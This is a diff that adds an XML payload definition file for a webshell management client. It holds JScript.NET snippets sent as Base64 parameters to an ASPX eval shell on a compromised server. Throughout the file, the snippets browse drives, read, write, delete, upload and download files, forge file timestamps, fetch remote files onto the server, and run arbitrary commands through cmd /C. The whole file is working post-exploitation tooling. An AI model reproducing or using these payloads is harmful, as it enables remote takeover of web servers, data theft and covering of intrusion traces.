@@ -1,0 +1,228 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<customShellType>
+  <funcCodeSetting>
+    <func>
+      <name>WwwRootPathCode</name>
+	  <type>aspxEval,aspxEval_Cookie</type>
+	  <path>/FileManager</path>
+      <item><![CDATA[Response.Write(Server.MapPath(".")+"\t");
+var c=System.IO.Directory.GetLogicalDrives();
+for(var i=0;i<=c.length-1;i++)
+	Response.Write(c[i][0]+": ");]]></item>
+    </func>
+    <func>
+      <name>FileTreeCode</name>
+	  <type>aspxEval,aspxEval_Cookie</type>
+	  <path>/FileManager</path>
+	  <funcParam location="Body" encrymode="Base64" >dirPath</funcParam>
+      <item><![CDATA[var D=System.Text.Encoding.Default.GetString(System.Convert.FromBase64String(Request.Item["$dirPath$"]));
+var m=new System.IO.DirectoryInfo(D);
+var s=m.GetDirectories();
+var P:String;
+var i;
+function T(p:String):String
+{
+	return System.IO.File.GetLastWriteTime(p).ToString("yyyy-MM-dd HH:mm:ss");
+}
+for(i in s)
+{
+	P=D+s[i].Name;
+	Response.Write(s[i].Name+"/\t"+T(P)+"\t0\t-\n");
+}
+s=m.GetFiles();
+for(i in s)
+{
+	P=D+s[i].Name;
+	Response.Write(s[i].Name+"\t"+T(P)+"\t"+s[i].Length+"\t-\n");
+}]]></item>
+    </func>
+    <func>
+      <name>ReadFileCode</name>
+	  <type>aspxEval,aspxEval_Cookie</type>
+	  <path>/FileManager</path>
+	  <funcParam location="Body" encrymode="Base64" >filePath</funcParam>
+      <item><![CDATA[var P=System.Text.Encoding.Default.GetString(System.Convert.FromBase64String(Request.Item["$filePath$"]));
+var m=new System.IO.StreamReader(P,Encoding.Default);
+Response.Write(m.ReadToEnd());
+m.Close();]]></item>
+    </func>
+    <func>
+      <name>WriteFileCode</name>
+	  <type>aspxEval,aspxEval_Cookie</type>
+	  <path>/FileManager</path>
+	  <funcParam location="Body" encrymode="Base64" >filePath</funcParam>
+	  <funcParam location="Body" encrymode="Base64" >fileContext</funcParam>
+      <item><![CDATA[var P=System.Text.Encoding.Default.GetString(System.Convert.FromBase64String(Request.Item["$filePath$"]));
+var Z2=System.Text.Encoding.Default.GetString(System.Convert.FromBase64String(Request.Item["$fileContext$"]));
+var m=new System.IO.StreamWriter(P,false,Encoding.Default);
+m.Write(Z2);
+m.Close();
+Response.Write("1");]]></item>
+    </func>
+    <func>
+      <name>DeleteFileOrDirCode</name>
+	  <type>aspxEval,aspxEval_Cookie</type>
+	  <path>/FileManager</path>
+	  <funcParam location="Body" encrymode="Base64" >fileOrDirPath</funcParam>
+      <item><![CDATA[var P=System.Text.Encoding.Default.GetString(System.Convert.FromBase64String(Request.Item["$fileOrDirPath$"]));
+if(System.IO.Directory.Exists(P))
+{
+	System.IO.Directory.Delete(P,true);
+}
+else
+{
+	System.IO.File.Delete(P);
+}
+Response.Write("1");]]></item>
+    </func>
+    <func>
+      <name>DownloadFileCode</name>
+	  <type>aspxEval,aspxEval_Cookie</type>
+	  <path>/FileManager</path>
+	  <funcParam location="Body" encrymode="Base64" >filePath</funcParam>
+      <item><![CDATA[var P=System.Text.Encoding.Default.GetString(System.Convert.FromBase64String(Request.Item["$filePath$"]));
+Response.WriteFile(P);]]></item>
+    </func>
+    <func>
+      <name>UploadFileCode</name>
+	  <type>aspxEval,aspxEval_Cookie</type>
+	  <path>/FileManager</path>
+	  <funcParam location="Body" encrymode="Base64" >savefilePath</funcParam>
+	  <funcParam location="Body" encrymode="Base64" >fileHexContext</funcParam>
+      <item><![CDATA[var P:String=System.Text.Encoding.Default.GetString(System.Convert.FromBase64String(Request.Item["$savefilePath$"]));
+var Z:String=System.Text.Encoding.Default.GetString(System.Convert.FromBase64String(Request.Item["$fileHexContext$"]));
+var B:byte[]=new byte[Z.Length/2];
+for(var i=0;i<Z.Length;i+=2)
+{
+	B[i/2]=byte(Convert.ToInt32(Z.Substring(i,2),16));
+}
+var fs:System.IO.FileStream=new System.IO.FileStream(P,System.IO.FileMode.Create);
+fs.Write(B,0,B.Length);
+fs.Close();
+Response.Write("1");]]></item>
+    </func>
+	<func>
+      <name>CopyFileOrDirCode</name>
+	  <type>aspxEval,aspxEval_Cookie</type>
+	  <path>/FileManager</path>
+	  <funcParam location="Body" encrymode="Base64" >sourceFilePath</funcParam>
+	  <funcParam location="Body" encrymode="Base64" >targetFilePath</funcParam>
+      <item><![CDATA[var S=System.Text.Encoding.Default.GetString(System.Convert.FromBase64String(Request.Item["$sourceFilePath$"]));
+var D=System.Text.Encoding.Default.GetString(System.Convert.FromBase64String(Request.Item["$targetFilePath$"]));
+function cp(S:String,D:String)
+{
+	if(System.IO.Directory.Exists(S))
+	{
+		var m=new System.IO.DirectoryInfo(S);
+		var i;
+		var f=m.GetFiles();
+		var d=m.GetDirectories();
+		System.IO.Directory.CreateDirectory(D);
+		for (i in f)
+			System.IO.File.Copy(S+"\\"+f[i].Name,D+"\\"+f[i].Name);
+		for (i in d)
+			cp(S+"\\"+d[i].Name,D+"\\"+d[i].Name);
+	}
+	else
+	{
+		System.IO.File.Copy(S,D);
+	}
+}
+cp(S,D);
+Response.Write("1");]]></item>
+    </func>
+    <func>
+      <name>RenameFileOrDirCode</name>
+	  <type>aspxEval,aspxEval_Cookie</type>
+	  <path>/FileManager</path>
+	  <funcParam location="Body" encrymode="Base64" >oldName</funcParam>
+	  <funcParam location="Body" encrymode="Base64" >newName</funcParam>
+      <item><![CDATA[var src:String=System.Text.Encoding.Default.GetString(System.Convert.FromBase64String(Request.Item["$oldName$"]));
+var dst:String=System.Text.Encoding.Default.GetString(System.Convert.FromBase64String(Request.Item["$newName$"]));
+if (System.IO.Directory.Exists(src))
+{
+	System.IO.Directory.Move(src,dst);
+}
+else
+{
+	System.IO.File.Move(src,dst);
+}
+Response.Write("1");]]></item>
+    </func>
+    <func>
+      <name>CreateDirCode</name>
+	  <type>aspxEval,aspxEval_Cookie</type>
+	  <path>/FileManager</path>
+	  <funcParam location="Body" encrymode="Base64" >dirPath</funcParam>
+      <item><![CDATA[var D=System.Text.Encoding.Default.GetString(System.Convert.FromBase64String(Request.Item["$dirPath$"]));
+System.IO.Directory.CreateDirectory(D);
+Response.Write("1");]]></item>
+    </func>
+    <func>
+      <name>ModifyFileOrDirTimeCode</name>
+	  <type>aspxEval,aspxEval_Cookie</type>
+	  <path>/FileManager</path>
+	  <funcParam location="Body" encrymode="Base64" >fileOrDirPath</funcParam>
+	  <funcParam location="Body" encrymode="Base64" >aTime</funcParam>
+      <item><![CDATA[var DD=System.Text.Encoding.Default.GetString(System.Convert.FromBase64String(Request.Item["$fileOrDirPath$"]));
+var TM=System.Text.Encoding.Default.GetString(System.Convert.FromBase64String(Request.Item["$aTime$"]));
+if(System.IO.Directory.Exists(DD))
+{
+	System.IO.Directory.SetCreationTime(DD,TM);
+	System.IO.Directory.SetLastWriteTime(DD,TM);
+	System.IO.Directory.SetLastAccessTime(DD,TM);
+}
+else
+{
+	System.IO.File.SetCreationTime(DD,TM);
+	System.IO.File.SetLastWriteTime(DD,TM);
+	System.IO.File.SetLastAccessTime(DD,TM);
+}
+Response.Write("1");]]></item>
+    </func>
+    <func>
+      <name>WgetCode</name>
+	  <type>aspxEval,aspxEval_Cookie</type>
+	  <path>/FileManager</path>
+	  <funcParam location="Body" encrymode="Base64" >urlPath</funcParam>
+	  <funcParam location="Body" encrymode="Base64" >saveFilePath</funcParam>
+      <item><![CDATA[var R=System.Text.Encoding.Default.GetString(System.Convert.FromBase64String(Request.Item["$urlPath$"]));
+var L=System.Text.Encoding.Default.GetString(System.Convert.FromBase64String(Request.Item["$saveFilePath$"]));
+var wc:System.Net.WebClient=new System.Net.WebClient();
+wc.DownloadFile(R,L);
+Response.Write("1");]]></item>
+    </func>
+    <func>
+      <name>SysInfoCode</name>
+	  <type>aspxEval,aspxEval_Cookie</type>
+	  <path>/Cmder</path>
+      <item><![CDATA[Response.Write(Server.MapPath(".")+"\t");
+Response.Write(System.Environment.OSVersion.ToString()+"\t");
+Response.Write("("+System.Environment.UserName+")\t");
+Response.Write(System.IO.Path.DirectorySeparatorChar);]]></item>
+    </func>
+    <func>
+      <name>ExecuteCommandCode</name>
+	  <type>aspxEval,aspxEval_Cookie</type>
+	  <path>/Cmder</path>
+	  <funcParam location="Body" encrymode="Base64" >cmdPath</funcParam>
+	  <funcParam location="Body" encrymode="Base64" >command</funcParam>
+      <item><![CDATA[var exe=System.Text.Encoding.Default.GetString(System.Convert.FromBase64String(Request.Item["$cmdPath$"]));
+var command=System.Text.Encoding.Default.GetString(System.Convert.FromBase64String(Request.Item["$command$"]));
+var info=new System.Diagnostics.ProcessStartInfo();
+info.FileName=exe;
+info.Arguments="/C " + command;
+info.UseShellExecute=false;
+info.RedirectStandardInput=false;
+info.RedirectStandardOutput=true;
+info.RedirectStandardError=true;
+var p=new System.Diagnostics.Process();
+p.StartInfo=info;
+p.Start();
+var output:String=p.StandardOutput.ReadToEnd();
+var error:String=p.StandardError.ReadToEnd();
+p.Close();
+Response.Write(output+error);]]></item>
+    </func>
+  </funcCodeSetting>
+</customShellType>
